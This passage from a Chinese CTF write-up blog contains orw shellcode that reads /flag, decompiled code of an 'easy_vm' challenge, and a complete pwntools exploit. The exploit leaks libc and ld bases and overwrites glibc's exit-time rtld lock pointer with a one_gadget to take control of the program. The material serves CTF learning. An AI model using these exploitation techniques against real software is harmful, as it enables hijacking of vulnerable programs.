<span class="token comment"># ''')</span>

orw_shellcode <span class="token operator">=</span> <span class="token string">b'\x90'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'''
xor rsi,rsi
xor rdx,rdx
push rdx
mov rax,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>convert_str_asmencode<span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">
push rax
mov rdi,rsp
xor rax,rax
mov al,2
syscall

mov rax,33 #  dup2(old_fd,new_fd) 
mov rdi,3  # flag_fd(3) to 0
mov rsi,0
syscall

mov rax,0
mov rdi,0
mov rsi,rsp
mov rdx,0x40 # read flag_content to rsp
syscall

mov rax,33
mov rdi,1 # 1 to 3
mov rsi,3
syscall

mov rax,1
mov rdi,3
mov rsi,rsp
mov rdx,0x40 
syscall
'''</span></span><span class="token punctuation">)</span>




s<span class="token punctuation">(</span>orw_shellcode<span class="token punctuation">)</span>


p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="easy-vm"><a href="#easy-vm" class="headerlink" title="easy_vm"></a>easy_vm</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"It's a easy vmpwn,enjoy it"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1000uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  ptr <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  stack_memroy <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1000uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  pc <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1000uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Inputs your code:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pc<span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>pc <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>pc <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                                   <span class="token comment">// push tmp</span>
        stack_memroy <span class="token operator">+=</span> <span class="token number">8LL</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>stack_memroy <span class="token operator">=</span> tmp<span class="token punctuation">;</span>
        pc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pc <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                                   <span class="token comment">// pop tmp</span>
        tmp <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>stack_memroy<span class="token punctuation">;</span>
        stack_memroy <span class="token operator">-=</span> <span class="token number">8LL</span><span class="token punctuation">;</span>
        pc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pc <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                                   <span class="token comment">// modify_memory</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>stack_memroy<span class="token punctuation">;</span>
        pc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pc <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>                                   <span class="token comment">// xor</span>
        tmp <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>pc <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pc <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>
        tmp <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>tmp<span class="token punctuation">;</span>                   <span class="token comment">// show_memory</span>
        pc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pc <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>                                   <span class="token comment">// add</span>
        tmp <span class="token operator">+=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>pc <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pc <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">7</span><span class="token operator">:</span>                                   <span class="token comment">// sub</span>
        tmp <span class="token operator">-=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>pc <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pc <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">default</span><span class="token operator">:</span>
        pc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pc <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>题目实现了一个简单的vm，有任意地址写的功能，然后stack_memroy残留了一个指向main_arena的指针，可以通过这个指针算出libc_base和ld_base，glibc 2.31下有一个exit hook，具体是exit - &gt; __run_exit_handlers -&gt; _dl_fini - &gt; (rtld_lock_default_lock_recursive &amp; rtld_lock_default_unlock_recursive ) lock 和 unlock这两个函数的调用方式是在rtld_global找这两个函数的指针然后call，然后rtld_global又在ld的数据段上，如果能知道ld_base就能算出这两个指针的地址，所以可以通过写这两个指针为one gadget去劫持控制流</p>
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>

gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span> <span class="token number">0x4526a</span><span class="token punctuation">,</span> <span class="token number">0xf02a4</span><span class="token punctuation">,</span> <span class="token number">0xf1147</span><span class="token punctuation">]</span>
one_gadget <span class="token operator">=</span> gadgets<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>

libc_base_offset <span class="token operator">=</span> <span class="token number">0x3c4b78</span>
ld_base_offset <span class="token operator">=</span> <span class="token number">0x400000</span>
exit_hook_offset <span class="token operator">=</span> <span class="token number">0x226f48</span>

<span class="token comment"># _dl_rtld_lock_recursive</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base_offset<span class="token punctuation">)</span>   <span class="token comment"># tmp = libc_base</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>     <span class="token comment"># tmp = one_gadget</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                       <span class="token comment"># push one_gadget</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>     <span class="token comment"># tmp = libc_base</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ld_base_offset<span class="token punctuation">)</span> <span class="token comment"># tmp = ld_base</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>exit_hook_offset<span class="token punctuation">)</span> <span class="token comment"># tmp = &amp;_dl_rtld_lock_recursive</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment"># &amp;_dl_rtld_lock_recursive = one_gadget</span>

<span class="token comment"># gdb.attach(p)</span>
p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'your code:'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


	  <div class="article-footer-copyright">
	Ciallo～(∠・ω< )⌒★
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/08/31/xyctf/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/08/22/奇奇怪怪格式化字符串漏洞的利用1/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-08-25 
	</div>
	

	<!-- categories -->
    

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/ctf-writeup/">ctf writeup<span>51</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
